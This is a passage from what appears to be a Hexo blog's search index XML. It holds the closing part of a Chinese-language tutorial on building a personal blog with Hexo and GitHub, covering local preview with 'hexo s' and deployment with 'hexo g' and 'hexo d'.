src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A216.png" alt="hexo new"></li></ol></li></ol></li><li><p>进行文章编写后预览</p><ol><li>vscode中文章编写完成后ctrl+s保存</li><li>在git bash中输入命令(在哪都可以)<code>hexo s</code>或者<code>hexo server</code>(上文有提到过)</li><li>会返回一个本机网址，进入网址即可看到自己的博客界面(默认主题未上传)</li></ol></li><li><p>将文章上传至github上</p><ol><li>输入命令<code>hexo g</code>先生成静态文件再<code>hexo d</code>部署到github上</li><li>再次访问个人网站即会出现你所作的更改啦(有时要等一会儿，不会马上就改变)</li></ol></li></ol><h2 id="7-结语"><a href="#7-结语" class="headerlink" title="7. 结语"></a>7. 结语</h2><ol><li>到这里hexo+github搭建个人博客就已经完成了，开始记录从0到1的成长之路吧！！！</li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
